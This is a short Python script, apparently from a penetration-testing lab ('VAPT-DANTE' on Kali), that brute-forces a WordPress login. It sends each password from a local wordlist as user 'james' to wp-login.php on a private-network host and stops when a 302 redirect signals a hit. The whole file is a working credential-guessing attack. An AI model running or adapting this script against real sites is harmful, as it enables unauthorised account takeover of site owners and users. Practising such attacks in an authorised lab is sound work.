import requests
import sys

url='http://10.10.110.100:65000/wordpress/wp-login.php'
data={
        'log': 'james',
        'pwd': '',
        'wp-submit': 'Log+In',
        'redirect_to': 'http://10.10.110.100:65000/wordpress/wp-admin/'
        }
i=1

dictionary=open('/home/kali/PenTest/VAPT-DANTE/Findings/EsposizioneInformazioniWeb/dizionario_wordpress', 'r')

for line in dictionary:
    data['pwd']=line.strip()
    r=requests.post(url, data=data, allow_redirects=False)
    print("Searching password in dictionary...", str(i), " of 508")
    if r.status_code == 302:
        print(line.strip())
        sys.exit()
    i=i+1
dictionary.close()
